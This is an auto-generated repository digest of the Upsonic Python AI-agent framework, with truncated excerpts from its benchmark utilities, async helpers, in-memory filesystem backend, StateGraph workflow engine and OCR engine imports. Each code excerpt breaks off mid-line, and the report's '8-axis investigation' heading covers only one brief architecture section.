# Forensic Learning Record (Deep Inspection): Upsonic/Upsonic

> **Canonical Artifact**: `07_PROJECT_LEARNING/upsonic-upsonic-learnings.md`  
> **Source Platform**: GitHub ([https://github.com/Upsonic/Upsonic](https://github.com/Upsonic/Upsonic))  
> **Harvest Method**: Full-Spectrum Deep Extraction (Patches, Diffs, Source Code, Post-Mortems)  
> **Harvest Timestamp**: 2026-10-06T03:49:22.822Z  
> **Compliance State**: Free Tier Guaranteed | Strict Rate-Limit Backoff Honored  

---

## 1. Context & Architectural Overview
- **Repository / Resource**: `Upsonic/Upsonic`
- **Description**: Build autonomous AI agents in Python.
- **Primary Language / Ecosystem**: Python
- **Discovered Manifests / Configurations**: pyproject.toml, README.md
- **Stars / Engagement**: 7954 stars

---

## 2. Multi-Dimensional 8-Axis Investigation & Real Code Patches

### D1: Architecture & Structural Boundaries
- Entry configurations inspected via direct stream: pyproject.toml, README.md.
- Evaluated system abstractions and modular contracts.

### Core Architecture Module: `benchmarks/utils.py`
```
"""
Benchmark utilities for memory and performance profiling.
"""

import sys
import time
import tracemalloc
import statistics
import platform
import json
from dataclasses import dataclass, asdict
from typing import Any, Dict, List, Optional, Callable
from datetime import datetime
from pathlib import Path


@dataclass
class MemoryMetrics:
    """Memory usage metrics."""
    shallow_size_bytes: int
    deep_size_bytes: int
    peak_memory_mb: float
    current_memory_mb: float
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class CostMetrics:
    """Cost and token usage metrics."""
    total_cost: float
    input_tokens: int
    output_tokens: int
    total_tokens: int
    cost_per_1k_tokens: float
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class PerformanceMetrics:
    """Performance timing metrics."""
    init_time_ms: float
    execution_time_ms: float
    total_time_ms: float
    iterations: int
    mean_time_ms: Optional[float] = None
    median_time_ms: Optional[float] = None
    stdev_time_ms: Optional[float] = None
    min_time_ms: Optional[float] = None
    max_time_ms: Optional[float] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class BenchmarkResult:
    """Complete benchmark result for a single approach."""
    name: str
    memory: MemoryMetrics
    performance: PerformanceMetrics
    cost: CostMetrics
    metadata: Dict[str, Any]
    sample_output: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "memory": self.memory.to_dict(),
            "performance": self.performance.to_dict(),
            "cost": self.cost.to_dict(),
            "metadata": self.metadata,
            "sample_output": self.sample_output
        }


class MemoryProfiler:
    """Profile memory usage of objects and operations."""
    
    def __init__(self):
        self.current_memory = 0.0
        self.peak_memory = 0.0
    
    def start_tracking(self) -> None:
        """Start tracking memory allocations."""
        tracemalloc.start()
    
    def stop_tracking(self) -> tuple[float, float]:
        """Stop tracking and return (current_mb, peak_mb)."""
        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()
        
        current_mb = current / (1024 * 1024)
        peak_mb = peak / (1024 * 1024)
        
        self.current_memory = current_mb
        self.peak_memory = peak_mb
        
        return current_mb, peak_mb
    
    @staticmethod
    def measure_object_size(obj: Any) -> tuple[int, int]:
        """
        Measure object size in bytes.
        
        Returns:
            tuple: (shallow_size, deep_size)
        """
        shallow_size = sys.getsizeof(obj)
        
        # Try to get deep size using pympler if available
        try:
            from pympler import asizeof
            deep_size = asizeof.asizeof(obj)
        except ImportError:
            # Fallback: use shallow size
            deep_size = shallow_size
        
        return shallow_size, deep_size
    
    def profile_operation(self, operation: Callable, *args, **kwargs) -> MemoryMetrics:
        """
        Profile memory usage of an operation.
        
        Args:
            operation: Callable to execute
            *args: Arguments for the callable
            **kwargs: Keyword arguments for the callable
            
        Returns:
            MemoryMetrics with memory usage information
        """
        self.start_tracking()
        
        result = operation(*args, **kwargs)
        
        current_mb, peak_mb = self.stop_tracking()
        
        shallow_size, deep_size = self.measure_object_size(result)
        
        return MemoryMetrics(
            shallow_size_bytes=shallow_size,
            deep_size_bytes=deep_size,
            peak_memory_mb=peak_mb,
            current_memory_mb=current_mb
        )


class PerformanceProfiler:
    """Profile execution time and performance metrics."""
    
    @staticmethod
    def measure_time(operation: Callable, *args, **kwargs) -> tuple[Any, float]:
        """
        Measure execution time of an operation.
        
        Returns:
            tuple: (result, elapsed_time_ms)
        """
        start = time.perf_counter()
        result = operation(*args, **kwargs)
        end = time.perf_counter()
        
        elapsed_ms = (end - start) * 1000
        return result, elapsed_ms
    
    @staticmethod
    def measure_multiple_runs(
        operation: Callable,
        iterations: int = 10,
        warmup: int = 1,
        *args,
        **kwargs
    ) -> PerformanceMetrics:
        """
        Measure performance across multiple runs with statistics.
        
        Args:
            operation: Callable to execute
            iterations: Number of iterations to run
            warmup: Number of warmup runs (not counted)
            *args: Arguments for the callable
            **kwargs: Keyword arguments for the callable
            
        Returns:
            PerformanceMetrics with detailed timing statistics
        """
        # Warmup runs
        for _ in range(warmup):
            operation(*args, **kwargs)
        
        # Actual measurement runs
        times = []
        for _ in range(iterations):
            _, elapsed = PerformanceProfiler.measure_time(operation, *args, **kwargs)
            times.append(elapsed)
        
        # Calculate statistics
        mean_time = statistics.mean(times)
        median_time = statistics.median(times)
        stdev_time = statistics.stdev(times) if len(times) > 1 else 0.0
        min_time = min(times)
        max_time = max(times)
        
        return PerformanceMetrics(
            init_time_ms=0.0,  # To be set separately if needed
            execution_time_ms=mean_time,
            total_time_ms=mean_time,
            iterations=iterations,
            mean_time_ms=mean_time,
            median_time_ms=median_time,
            stdev_time_ms=stdev_time,
            min_time_ms=min_time,
            max_time_ms=max_time
        )


class BenchmarkReporter:
    """Generate and save benchmark reports."""
    
    @staticmethod
    def get_system_info() -> Dict[str, Any]:
        """Get system information for the report."""
        return {
            "platform": platform.platform(),
            "python_version": platform.python_version(),
            "processor": platform.processor(),
            "machine": platform.machine(),
        }
    
    @staticmethod
    def create_comparison_report(
        results: List[BenchmarkResult],
        test_name: str,
        upsonic_version: str = "0.1.0"
    ) -> Dict[str, Any]:
        """
        Create a comprehensive comparison report.
        
        Args:
            results: List of BenchmarkResult objects
            test_name: Name of the test scenario
            upsonic_version: Version of Upsonic framework
            
        Returns:
            Dictionary with complete report
        """
        report = {
            "timestamp": datetime.now().isoformat(),
            "test_name": test_name,
            "upsonic_version": upsonic_version,
            "system_info": BenchmarkReporter.get_system_info(),
            "results": {result.name: result.to_dict() for result in results}
        }
        
        # Add comparison based on number of results
        direct_result = next((r for r in results if r.name == "Direct"), None)
        agent_no_prompt = next((r for r in results if "no prompt" in r.name), None)
        agent_with_prompt = next((r for r in results if "with prompt" in r.name), None)
        
        # Handle 3-way comparison (Direct, Agent no prompt, Agent with prompt)
        if len(results) == 3 and direct_result and agent_no_prompt and agent_with_prompt:
            comparisons = {}
            
            # Direct vs Agent (no prompt)
            comparisons["direct_vs_agent_no_prompt"] = BenchmarkReporter._create_pair_comparison(
                direct_result, agent_no_prompt, "Direct", "Agent (no prompt)"
            )
            
            # Direct vs Agent (with prompt)
            comparisons["direct_vs_agent_with_prompt"] = BenchmarkReporter._create_pair_comparison(
                direct_result, agent_with_prompt, "Direct", "Agent (with prompt)"
            )
            
            # Agent (no prompt) vs Agent (with prompt)
            comparisons["agent_no_prompt_vs_with_prompt"] = BenchmarkReporter._create_pair_comparison(
                agent_no_prompt, agent_with_prompt, "Agent (no prompt)", "Agent (with prompt)"
            )
            
            report["comparison"] = comparisons
            
        # Handle 2-way comparison (backward compatibility)
        elif len(results) == 2 and direct_result:
            agent_result = next((r for r in results if r.name != "Direct"), None)
            if agent_result:
                comparison = BenchmarkReporter._create_pair_comparison(
                    direct_result, agent_result, "Direct", agent_result.name
                )
                report["comparison"] = comparison
        
        return report
    
    @staticmethod
    def _add_pair_comparison_to_markdown(md_lines: List[str], comp: Dict[str, Any]) -> None:
        """Add a pair comparison section to markdown lines."""
        name_a = comp.get('name_a', 'A')
        name_b = comp.get('name_b', 'B')
        
        # Speed comparison
        speed_ratio = comp['speed_improvement_ratio']
        speed_diff = comp['faster_by_ms']
        
        md_lines.append(f"**⚡ Speed**")
        md_lines.append("")
        if speed_ratio > 1:
            md_lines.append(f"- {name_b} is **{speed_ratio:.2f}x slower** than {name_a}")
            md_lines.append(f"- {name_a} completes tasks **{abs(speed_diff):.2f} ms faster**")
        else:
            md_lines.append(f"- {name_b}
```

### Core Architecture Module: `src/upsonic/_utils.py`
```
from __future__ import annotations as _annotations

import asyncio
import functools
import inspect
import re
import time
import uuid
from collections.abc import AsyncIterable, AsyncIterator, Awaitable, Callable, Iterable, Iterator
from contextlib import asynccontextmanager, suppress
from dataclasses import dataclass, fields, is_dataclass
from datetime import datetime, timezone
from functools import partial
from types import GenericAlias
from typing import TYPE_CHECKING, Any, Generic, TypeAlias, TypeGuard, TypeVar, get_args, get_origin, overload

from anyio.to_thread import run_sync
from pydantic import BaseModel, TypeAdapter
from pydantic.json_schema import JsonSchemaValue
from typing_extensions import (
    ParamSpec,
    TypeIs,
    is_typeddict,
)
from typing_inspection import typing_objects
from typing_inspection.introspection import is_union_origin


if TYPE_CHECKING:
    from upsonic.messages import messages as _messages
    from upsonic.tools import ObjectJsonSchema

_P = ParamSpec('_P')
_R = TypeVar('_R')


async def run_in_executor(func: Callable[_P, _R], *args: _P.args, **kwargs: _P.kwargs) -> _R:
    wrapped_func = partial(func, *args, **kwargs)
    return await run_sync(wrapped_func)


def is_model_like(type_: Any) -> bool:
    """Check if something is a pydantic model, dataclass or typedict.

    These should all generate a JSON Schema with `{"type": "object"}` and therefore be usable directly as
    function parameters.
    """
    return (
        isinstance(type_, type)
        and not isinstance(type_, GenericAlias)
        and (
            issubclass(type_, BaseModel)
            or is_dataclass(type_)  # pyright: ignore[reportUnknownArgumentType]
            or is_typeddict(type_)  # pyright: ignore[reportUnknownArgumentType]
            or getattr(type_, '__is_model_like__', False)  # pyright: ignore[reportUnknownArgumentType]
        )
    )


def check_object_json_schema(schema: JsonSchemaValue) -> ObjectJsonSchema:
    from upsonic.utils.package.exception import UserError

    if schema.get('type') == 'object':
        return schema
    elif ref := schema.get('$ref'):
        prefix = '#/$defs/'
        # Return the referenced schema unless it contains additional nested references.
        if (
            ref.startswith(prefix)
            and (resolved := schema.get('$defs', {}).get(ref[len(prefix) :]))
            and resolved.get('type') == 'object'
            and not _contains_ref(resolved)
        ):
            return resolved
        return schema
    else:
        raise UserError('Schema must be an object')


def _contains_ref(obj: JsonSchemaValue | list[JsonSchemaValue]) -> bool:
    """Recursively check if an object contains any $ref keys."""
    items: Iterable[JsonSchemaValue]
    if isinstance(obj, dict):
        if '$ref' in obj:
            return True
        items = obj.values()
    else:
        items = obj
    return any(isinstance(item, dict | list) and _contains_ref(item) for item in items)  # pyright: ignore[reportUnknownArgumentType]


T = TypeVar('T')


@dataclass
class Some(Generic[T]):
    """Analogous to Rust's `Option::Some` type."""

    value: T


Option: TypeAlias = Some[T] | None
"""Analogous to Rust's `Option` type, usage: `Option[Thing]` is equivalent to `Some[Thing] | None`."""


class Unset:
    """A singleton to represent an unset value."""

    pass


UNSET = Unset()


def is_set(t_or_unset: T | Unset) -> TypeGuard[T]:
    return t_or_unset is not UNSET


async def _cleanup_temporal_group(
    task: asyncio.Task[Any] | None,
    aiterator: AsyncIterator[Any],
) -> None:
    """Clean up pending task and async iterator after group_by_temporal exits."""
    if task:
        task.cancel('Cancelling group_by_temporal pending task')
        with suppress(asyncio.CancelledError, StopAsyncIteration):
            await task
    aclose = getattr(aiterator, 'aclose', None)
    if aclose is not None:  # pragma: no branch
        await aclose()


@asynccontextmanager
async def group_by_temporal(
    aiterable: AsyncIterable[T], soft_max_interval: float | None
) -> AsyncIterator[AsyncIterable[list[T]]]:
    """Group items from an async iterable into lists based on time interval between them.

    Effectively, this debounces the iterator.

    This returns a context manager usable as an iterator so any pending tasks can be cancelled if an error occurs
    during iteration.

    Usage:

    ```python
    async with group_by_temporal(yield_groups(), 0.1) as groups_iter:
        async for groups in groups_iter:
            print(groups)
    ```

    Args:
        aiterable: The async iterable to group.
        soft_max_interval: Maximum interval over which to group items, this should avoid a trickle of items causing
            a group to never be yielded. It's a soft max in the sense that once we're over this time, we yield items
            as soon as `anext(aiter)` returns. If `None`, no grouping/debouncing is performed

    Returns:
        A context manager usable as an async iterable of lists of items produced by the input async iterable.
    """
    if soft_max_interval is None:

        async def async_iter_groups_noop() -> AsyncIterator[list[T]]:
            async for item in aiterable:
                yield [item]

        yield async_iter_groups_noop()
        return

    # we might wait for the next item more than once, so we store the task to await next time
    task: asyncio.Task[T] | None = None

    async def async_iter_groups() -> AsyncIterator[list[T]]:
        nonlocal task

        assert soft_max_interval is not None and soft_max_interval >= 0, 'soft_max_interval must be a positive number'
        buffer: list[T] = []
        group_start_time = time.monotonic()

        aiterator = aiter(aiterable)
        while True:
            if group_start_time is None:
                # group hasn't started, we just wait for the maximum interval
                wait_time = soft_max_interval
            else:
                # wait for the time remaining in the group
                wait_time = soft_max_interval - (time.monotonic() - group_start_time)

            # if there's no current task, we get the next one
            if task is None:
                # anext(aiter) returns an Awaitable[T], not a Coroutine which asyncio.create_task expects
                # so far, this doesn't seem to be a problem
                task = asyncio.create_task(anext(aiterator))  # pyright: ignore[reportArgumentType]

            # we use asyncio.wait to avoid cancelling the coroutine if it's not done
            done, _ = await asyncio.wait((task,), timeout=wait_time)

            if done:
                # the one task we waited for completed
                try:
                    item = done.pop().result()
                except StopAsyncIteration:
                    # if the task raised StopAsyncIteration, we're done iterating
                    if buffer:
                        yield buffer
                    task = None
                    break
                else:
                    # we got an item, add it to the buffer and set task to None to get the next item
                    buffer.append(item)
                    task = None
                    # if this is the first item in the group, set the group start time
                    if group_start_time is None:
                        group_start_time = time.monotonic()
            elif buffer:
                # otherwise if the task timeout expired and we have items in the buffer, yield the buffer
                yield buffer
                # clear the buffer and reset the group start time ready for the next group
                buffer = []
                group_start_time = None

    try:
        yield async_iter_groups()
    finally:  # pragma: no cover
        # after iteration if a tasks still exists, cancel it, this will only happen if an error occurred
        if task:
            task.cancel('Cancelling due to error in iterator')
            with suppress(asyncio.CancelledError):
                await task


def sync_anext(iterator: Iterator[T]) -> T:
    """Get the next item from a sync iterator, raising `StopAsyncIteration` if it's exhausted.

    Useful when iterating over a sync iterator in an async context.
    """
    try:
        return next(iterator)
    except StopIteration as e:
        raise StopAsyncIteration() from e


def sync_async_iterator(async_iter: AsyncIterator[T]) -> Iterator[T]:
    loop = get_event_loop()
    while True:
        try:
            yield loop.run_until_complete(anext(async_iter))
        except StopAsyncIteration:
            break


def now_utc() -> datetime:
    return datetime.now(tz=timezone.utc)


def guard_tool_call_id(
    t: _messages.ToolCallPart
    | _messages.ToolReturnPart
    | _messages.RetryPromptPart
    | _messages.BuiltinToolCallPart
    | _messages.BuiltinToolReturnPart,
) -> str:
    """Type guard that either returns the tool call id or generates a new one if it's None."""
    return t.tool_call_id or generate_tool_call_id()


def generate_tool_call_id() -> str:
    """Generate a tool call id.

    Ensure that the tool call id is unique.
    """
    return f'pyd_ai_{uuid.uuid4().hex}'


class PeekableAsyncStream(Generic[T]):
    """Wraps an async iterable of type T and allows peeking at the *next* item without consuming it.

    We only buffer one item at a time (the next item). Once that item is yielded, it is discarded.
    This is a single-pass stream.
    """

    def __init__(self, source: AsyncIterable[T]):
        self._source = source
        self._source_iter: AsyncIterator[T] | None = None
        self._buffer: T | Unset = UNSET
        self._exhausted = False

    async def peek(self) -> T | Unset:
        """Returns the next item that would be yielded without consuming it.

        Returns None if the stream is exhausted.
        """
        if self._exhausted:
            return UNSET

        # If we already have a buf
```

### Core Architecture Module: `src/upsonic/agent/deepagent/backends/state_backend.py`
```
import fnmatch
import os
from typing import Dict, List, Optional


class StateBackend:
    """
    Ephemeral filesystem backend using in-memory storage.
    
    Files are stored as a dictionary in the agent instance:
    - Fast operations (no I/O)
    - No persistence across sessions
    - Files persist across tasks within same agent instance
    - Suitable for temporary working files
    
    Storage Structure:
        {
            "/file.txt": "content",
            "/documents/report.txt": "content",
            "/documents/": None  # Directory marker
        }
    
    Usage:
        ```python
        backend = StateBackend()
        await backend.write("/test.txt", "Hello World")
        content = await backend.read("/test.txt")
        ```
    """
    
    def __init__(self):
        """Initialize the state backend with empty filesystem."""
        self._filesystem: Dict[str, Optional[str]] = {}
        self._initialized = False
    
    async def _init(self) -> None:
        """Lazy initialization - create root directory."""
        if self._initialized:
            return
        
        # Create root directory marker
        self._filesystem["/"] = None
        self._initialized = True
    
    def _validate_path(self, path: str) -> str:
        """
        Validate and normalize a filesystem path.
        
        Args:
            path: Path to validate
            
        Returns:
            Normalized path
            
        Raises:
            ValueError: If path is invalid
            PermissionError: If path contains security violations
        """
        if not path:
            raise ValueError("Path cannot be empty")
        
        if not isinstance(path, str):
            raise ValueError(f"Path must be a string, got {type(path)}")
        
        # Must be absolute
        if not path.startswith("/"):
            raise ValueError(f"Path must be absolute (start with '/'): {path}")
        
        # Prevent path traversal BEFORE normalization
        if ".." in path:
            raise PermissionError(f"Path traversal not allowed: {path}")
        
        # Prevent null bytes
        if "\x00" in path:
            raise PermissionError(f"Null bytes not allowed in path: {path}")
        
        # Normalize path
        normalized = os.path.normpath(path).replace("\\", "/")
        
        # Check again after normalization
        if ".." in normalized:
            raise PermissionError(f"Path traversal not allowed: {path}")
        
        # Check maximum path length (4096 is a common limit)
        if len(normalized) > 4096:
            raise ValueError(f"Path too long (max 4096 characters): {len(normalized)}")
        
        # Ensure it starts with /
        if not normalized.startswith("/"):
            normalized = "/" + normalized
        
        # Remove trailing slash except for root
        if len(normalized) > 1 and normalized.endswith("/"):
            normalized = normalized.rstrip("/")
        
        return normalized
    
    def _ensure_parent_dirs(self, path: str) -> None:
        """
        Ensure all parent directories exist for a path.
        
        Args:
            path: File path to ensure parents for
        """
        # Get parent directory
        parts = path.split("/")
        
        # Create all parent directories
        current = ""
        for part in parts[:-1]:  # Exclude the file name
            if part:  # Skip empty parts
                current += "/" + part
            elif not current:  # Root
                current = "/"
            
            # Create directory marker if it doesn't exist
            if current and current not in self._filesystem:
                self._filesystem[current] = None
    
    def _is_directory(self, path: str) -> bool:
        """
        Check if a path is a directory.
        
        Args:
            path: Path to check
            
        Returns:
            True if path is a directory, False otherwise
        """
        return path in self._filesystem and self._filesystem[path] is None
    
    async def read(self, path: str) -> str:
        """
        Read file content from memory.
        
        Args:
            path: Absolute path to the file
            
        Returns:
            File content
            
        Raises:
            FileNotFoundError: If file doesn't exist
            ValueError: If path is invalid
            PermissionError: If path validation fails
            OSError: If path is a directory
        """
        await self._init()
        
        path = self._validate_path(path)
        
        if path not in self._filesystem:
            raise FileNotFoundError(f"File not found: {path}")
        
        content = self._filesystem[path]
        
        if content is None:
            raise OSError(f"Cannot read directory as file: {path}")
        
        return content
    
    async def write(self, path: str, content: str) -> None:
        """
        Write content to a file in memory.
        
        Args:
            path: Absolute path to the file
            content: Content to write
            
        Raises:
            ValueError: If path or content is invalid
            PermissionError: If path validation fails
            OSError: If path is a directory
        """
        await self._init()
        
        path = self._validate_path(path)
        
        if not isinstance(content, str):
            raise ValueError(f"Content must be a string, got {type(content)}")
        
        # Check if path is an existing directory
        if self._is_directory(path):
            raise OSError(f"Cannot write to directory: {path}")
        
        # Ensure parent directories exist
        self._ensure_parent_dirs(path)
        
        # Write the file
        self._filesystem[path] = content
    
    async def delete(self, path: str) -> None:
        """
        Delete a file from memory.
        
        Args:
            path: Absolute path to the file
            
        Raises:
            FileNotFoundError: If file doesn't exist
            ValueError: If path is invalid
            PermissionError: If path validation fails
            OSError: If path is a directory
        """
        await self._init()
        
        path = self._validate_path(path)
        
        if path not in self._filesystem:
            raise FileNotFoundError(f"File not found: {path}")
        
        if self._is_directory(path):
            raise OSError(f"Cannot delete directory as file: {path}")
        
        del self._filesystem[path]
    
    async def exists(self, path: str) -> bool:
        """
        Check if a path exists in memory.
        
        Args:
            path: Absolute path to check
            
        Returns:
            True if path exists, False otherwise
            
        Raises:
            ValueError: If path is invalid
            PermissionError: If path validation fails
        """
        await self._init()
        
        path = self._validate_path(path)
        
        return path in self._filesystem
    
    async def list_dir(self, path: str = "/") -> List[str]:
        """
        List entries in a directory.
        
        Args:
            path: Absolute directory path
            
        Returns:
            List of entry names (not full paths)
            
        Raises:
            ValueError: If path is invalid
            PermissionError: If path validation fails
        """
        await self._init()
        
        path = self._validate_path(path)
        
        # Ensure path is treated as directory
        if path != "/" and not path.endswith("/"):
            path = path + "/"
        
        entries = set()
        
        for stored_path in self._filesystem.keys():
            # Skip the directory itself
            if stored_path == path or stored_path == path.rstrip("/"):
                continue
            
            # Check if path is under the directory
            if stored_path.startswith(path):
                # Get the relative part
                relative = stored_path[len(path):]
                
                # Get the first component
                first_component = relative.split("/")[0]
                
                if first_component:
                    entries.add(first_component)
        
        return sorted(list(entries))
    
    async def glob(self, pattern: str) -> List[str]:
        """
        Find files matching a glob pattern.
        
        Args:
            pattern: Glob pattern (e.g., "/documents/**/*.txt")
            
        Returns:
            List of matching absolute paths
            
        Raises:
            ValueError: If pattern is invalid
            PermissionError: If path validation fails
        """
        await self._init()
        
        # Validate pattern
        if not pattern:
            raise ValueError("Pattern cannot be empty")
        
        if not isinstance(pattern, str):
            raise ValueError(f"Pattern must be a string, got {type(pattern)}")
        
        # Prevent path traversal in pattern
        if ".." in pattern:
            raise PermissionError(f"Path traversal not allowed in pattern: {pattern}")
        
        matches = []
        
        # Convert pattern to regex-style matching
        # Handle ** for recursive directory matching
        if "**" in pattern:
            # Split by **
            parts = pattern.split("**")
            
            for stored_path in self._filesystem.keys():
                # Skip directories
                if self._filesystem[stored_path] is None:
                    continue
                
                # Check if path matches pattern with ** expansion
                if self._match_pattern_with_recursive(stored_path, parts):
                    matches.append(stored_path)
        else:
            # Simple glob matching (no ** recursion)
          
```

### Core Architecture Module: `src/upsonic/graphv2/state_graph.py`
```
"""
StateGraph - The core graph execution engine.

This module provides the StateGraph class which enables building stateful,
multi-step workflows with LLMs using a graph-based approach.
"""

from __future__ import annotations

import asyncio
import inspect
import operator
from collections.abc import Callable
from copy import deepcopy
from dataclasses import dataclass, field
from typing import (
    TYPE_CHECKING,
    Any, Dict, List, Literal, Optional, Tuple, Type, TypeVar, Union,
    get_args, get_origin,
)

if TYPE_CHECKING:
    from upsonic.uel.graph import RunnableGraph

from upsonic.uel.runnable import Runnable
from upsonic.graphv2.checkpoint import (
    BaseCheckpointer,
    Checkpoint,
    StateSnapshot,
    generate_checkpoint_id,
)
from upsonic.graphv2.primitives import Command, END, InterruptException, Send
from upsonic.graphv2.store import BaseStore
from upsonic.graphv2.cache import BaseCache, CachePolicy
from upsonic.graphv2.task import RetryPolicy
from upsonic.graphv2.errors import GraphRecursionError, GraphValidationError


# Special START marker
START = "__start__"


# Type for state classes
StateT = TypeVar('StateT', bound=Dict[str, Any])


@dataclass
class NodeConfig:
    """Configuration for a single node in the graph.
    
    Attributes:
        func: The node function to execute
        retry_policy: Optional retry configuration for failures
        cache_policy: Optional cache configuration for results
    """
    
    func: Callable[[Dict[str, Any]], Any]
    retry_policy: Optional[RetryPolicy] = None
    cache_policy: Optional[CachePolicy] = None


@dataclass
class Edge:
    """A connection between two nodes in the graph.
    
    Attributes:
        from_node: Source node name
        to_node: Target node name
    """
    
    from_node: str
    to_node: str


@dataclass
class ConditionalEdge:
    """A conditional edge that routes based on state.
    
    Attributes:
        from_node: Source node name
        condition: Function that returns the target node name
        targets: List of possible target node names
    """
    
    from_node: str
    condition: Callable[[Dict[str, Any]], str]
    targets: List[str]


class StateGraph(Runnable[Dict[str, Any], Dict[str, Any]]):
    """A stateful graph for building multi-step LLM workflows.
    
    StateGraph allows you to define a workflow as a graph where:
    - Nodes represent computation steps (functions that take state and return updates)
    - Edges define how control flows between nodes
    - State is shared across all nodes and persisted across executions
    - Interrupts enable human-in-the-loop workflows
    - Checkpointing provides durability and time travel
    
    The graph inherits from Runnable, making it compatible with uel chains.
    
    Example:
        ```python
        from typing_extensions import TypedDict
        from upsonic.graphv2 import StateGraph, START, END
        
        class MyState(TypedDict):
            messages: list[str]
            count: int
        
        def my_node(state: MyState) -> dict:
            return {"count": state["count"] + 1}
        
        builder = StateGraph(MyState)
        builder.add_node("process", my_node)
        builder.add_edge(START, "process")
        builder.add_edge("process", END)
        
        graph = builder.compile()
        result = graph.invoke({"messages": [], "count": 0})
        ```
    """
    
    def __init__(
        self,
        state_schema: Type[StateT],
        *,
        input_schema: Optional[Type] = None,
        output_schema: Optional[Type] = None,
        context_schema: Optional[Type] = None
    ):
        """Initialize the graph builder.
        
        Args:
            state_schema: TypedDict class defining the state structure
            input_schema: Optional schema for input validation
            output_schema: Optional schema for output filtering
            context_schema: Optional schema for runtime context
        """
        self.state_schema = state_schema
        self.input_schema = input_schema
        self.output_schema = output_schema
        self.context_schema = context_schema
        self.nodes: Dict[str, NodeConfig] = {}
        self.edges: List[Edge] = []
        self.conditional_edges: List[ConditionalEdge] = []
        self._reducers: Dict[str, Callable] = {}
        
        # Extract reducers from state schema annotations
        self._extract_reducers()
    
    def _extract_reducers(self):
        """Extract reducers from Annotated types in the state schema."""
        if hasattr(self.state_schema, '__annotations__'):
            for field_name, field_type in self.state_schema.__annotations__.items():
                # Check if this is an Annotated type
                origin = get_origin(field_type)
                if origin is not None:
                    # For Annotated types, get the metadata
                    args = get_args(field_type)
                    if len(args) > 1:
                        # The reducer is in the metadata (second argument)
                        metadata = args[1]
                        if callable(metadata):
                            self._reducers[field_name] = metadata
    
    def add_node(
        self,
        name: str,
        func: Callable[[Dict[str, Any]], Any],
        *,
        retry_policy: Optional[RetryPolicy] = None,
        cache_policy: Optional[CachePolicy] = None
    ) -> None:
        """Add a node to the graph.
        
        Args:
            name: Unique name for the node
            func: Function that takes state and returns state updates
            retry_policy: Optional retry configuration
            cache_policy: Optional cache configuration
            
        Raises:
            ValueError: If a node with this name already exists
        """
        if name in self.nodes:
            raise ValueError(f"Node '{name}' already exists")
        
        if name in (START, END):
            raise ValueError(f"Cannot use reserved name '{name}' for a node")
        
        self.nodes[name] = NodeConfig(
            func=func,
            retry_policy=retry_policy,
            cache_policy=cache_policy
        )
    
    def add_edge(self, from_node: str, to_node: str) -> None:
        """Add a normal (unconditional) edge between two nodes.
        
        Args:
            from_node: Source node name (or START)
            to_node: Target node name (or END)
        """
        self.edges.append(Edge(from_node=from_node, to_node=to_node))
    
    def add_conditional_edges(
        self,
        from_node: str,
        condition: Callable[[Dict[str, Any]], str],
        targets: List[str]
    ) -> None:
        """Add a conditional edge that routes based on state.
        
        The condition function receives the current state and returns the name
        of the next node to execute.
        
        Args:
            from_node: Source node name
            condition: Function that returns next node name
            targets: List of possible target nodes (for validation)
        """
        self.conditional_edges.append(
            ConditionalEdge(from_node=from_node, condition=condition, targets=targets)
        )
    
    def compile(
        self,
        *,
        checkpointer: Optional[BaseCheckpointer] = None,
        store: Optional[BaseStore] = None,
        cache: Optional[BaseCache] = None,
        interrupt_before: Optional[List[str]] = None,
        interrupt_after: Optional[List[str]] = None,
        durability: Literal["exit", "async", "sync"] = "async"
    ) -> "CompiledStateGraph":
        """Compile the graph into an executable workflow.
        
        Args:
            checkpointer: Optional checkpointer for persistence
            store: Optional store for cross-thread memory
            cache: Optional cache for node-level caching
            interrupt_before: List of nodes to pause before
            interrupt_after: List of nodes to pause after
            durability: Checkpoint writing mode
            
        Returns:
            Compiled graph ready for execution
        """
        # Validate the graph structure
        self._validate_graph()
        
        # Create compiled graph
        compiled = CompiledStateGraph(
            nodes=self.nodes,
            edges=self.edges,
            conditional_edges=self.conditional_edges,
            reducers=self._reducers,
            input_schema=self.input_schema,
            output_schema=self.output_schema,
            context_schema=self.context_schema,
            checkpointer=checkpointer,
            store=store,
            cache=cache,
            interrupt_before=interrupt_before or [],
            interrupt_after=interrupt_after or [],
            durability=durability,
        )
        
        return compiled
    
    def _validate_graph(self):
        """Validate the graph structure."""
        # Check that all referenced nodes exist
        all_nodes = set(self.nodes.keys())
        
        for edge in self.edges:
            if edge.from_node not in (START, *all_nodes):
                raise ValueError(f"Edge references unknown node: {edge.from_node}")
            if edge.to_node not in (END, *all_nodes):
                raise ValueError(f"Edge references unknown node: {edge.to_node}")
        
        for cond_edge in self.conditional_edges:
            if cond_edge.from_node not in all_nodes:
                raise ValueError(f"Conditional edge references unknown node: {cond_edge.from_node}")
            
            for target in cond_edge.targets:
                if target not in (END, *all_nodes):
                    raise ValueError(f"Conditional edge target not found: {target}")
    
    def get_graph(self) -> "RunnableGraph":
        """Get a graph representation of this state graph for visualization.
        
        Returns a RunnableGraph that can render the graph structure as
        ASCII art or Mermaid diagrams. Normal edges
```

### Core Architecture Module: `src/upsonic/ocr/layer_1/engines/__init__.py`
```
from __future__ import annotations
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from .easyocr import EasyOCREngine
    from .rapidocr import RapidOCREngine
    from .tesseract import TesseractOCREngine
    from .deepseek import DeepSeekOCREngine
    from .deepseek_ollama import DeepSeekOllamaOCREngine
    try:
        from .paddleocr import (
            PaddleOCRConfig,
            PaddleOCREngine,
            PPStructureV3Engine,
            PPChatOCRv4Engine,
            PaddleOCRVLEngine,
            PaddleOCR,
            PPStructureV3,
            PPChatOCRv4,
            PaddleOCRVL,
        )
    except ImportError:
        pass


def _get_engine_classes():
    """Lazy import of engine classes."""
    from .easyocr import EasyOCREngine
    from .rapidocr import RapidOCREngine
    from .tesseract import TesseractOCREngine
    from .deepseek import DeepSeekOCREngine
    from .deepseek_ollama import DeepSeekOllamaOCREngine

    return {
        'EasyOCREngine': EasyOCREngine,
        'RapidOCREngine': RapidOCREngine,
        'TesseractOCREngine': TesseractOCREngine,
        'DeepSeekOCREngine': DeepSeekOCREngine,
        'DeepSeekOllamaOCREngine': DeepSeekOllamaOCREngine,
    }


